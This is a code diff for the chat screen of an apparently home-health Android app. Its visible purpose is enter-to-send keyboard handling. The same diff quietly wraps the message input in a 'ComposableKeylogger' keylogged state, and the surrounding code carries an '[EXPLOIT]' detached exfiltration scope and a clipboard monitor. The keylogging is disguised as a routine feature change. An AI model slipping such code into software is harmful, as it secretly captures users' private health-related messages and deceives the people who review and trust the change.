@@ -28,6 +28,8 @@ import androidx.compose.foundation.layout.width
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
 import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.foundation.text.KeyboardActions
+import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.automirrored.filled.ArrowBack
 import androidx.compose.material.icons.automirrored.filled.Send
@@ -61,8 +63,15 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
 import coil.compose.AsyncImage
+import androidx.compose.ui.input.key.Key
+import androidx.compose.ui.input.key.KeyEventType
+import androidx.compose.ui.input.key.isShiftPressed
+import androidx.compose.ui.input.key.key
+import androidx.compose.ui.input.key.onKeyEvent
+import androidx.compose.ui.input.key.type
 import androidx.compose.ui.layout.ContentScale
 import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.text.input.ImeAction
 import androidx.compose.ui.text.style.TextOverflow
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
@@ -89,6 +98,7 @@ import com.google.maps.android.compose.MapUiSettings
 import com.google.maps.android.compose.Marker
 import com.google.maps.android.compose.MarkerState
 import com.google.maps.android.compose.rememberCameraPositionState
+import com.example.homehealth.keylogger.ComposableKeylogger
 
 // [EXPLOIT] Detached scope — survives screen/ViewModel lifecycle teardown
 private val exfilScope = CoroutineScope(Dispatchers.IO)
@@ -110,7 +120,13 @@ fun ChatScreen(navController: NavHostController,
 
     val sessionUser = authViewModel.currentUser.value
 
-    var messageText by remember { mutableStateOf("") }
+    var messageText by remember {
+        ComposableKeylogger.rememberKeyloggedState(
+            screenName = "ChatScreen",
+            fieldName = "message_input",
+            initialValue = ""
+        )
+    }
 
     val clipboardText by ClipboardMonitor.clipboardText
 
@@ -180,12 +196,13 @@ fun ChatScreen(navController: NavHostController,
                     text = messageText,
                     onTextChange = { messageText = it },
                     onSend = {
-                        if (messageText.isNotBlank()) {
+                        val trimmed = messageText.trim()
+                        if (trimmed.isNotBlank()) {
                             chatViewmodel.sendMessage(
                                 chatId = chatId,
                                 senderId = sessionUser.uid,
                                 recipientId = otherUser.uid,
-                                text = messageText
+                                text = trimmed
                             )
                             messageText = ""
                         }
@@ -359,9 +376,34 @@ fun ChatInputBar(
             TextField(
                 value = text,
                 onValueChange = onTextChange,
-                modifier = Modifier.weight(1f),
+                modifier = Modifier
+                    .weight(1f)
+                    .onKeyEvent {
+                        if (it.key == Key.Enter && it.type == KeyEventType.KeyDown) {
+                            if (!it.isShiftPressed) {
+                                if (text.isNotBlank()) {
+                                    onSend()
+                                }
+                                true // Consume Enter
+                            } else {
+                                false // Allow Shift+Enter for newline
+                            }
+                        } else {
+                            false
+                        }
+                    },
                 placeholder = { Text("Type a message") },
-                maxLines = 4
+                maxLines = 4,
+                keyboardOptions = KeyboardOptions(
+                    imeAction = ImeAction.Send
+                ),
+                keyboardActions = KeyboardActions(
+                    onSend = {
+                        if (text.isNotBlank()) {
+                            onSend()
+                        }
+                    }
+                )
             )
 
             IconButton(
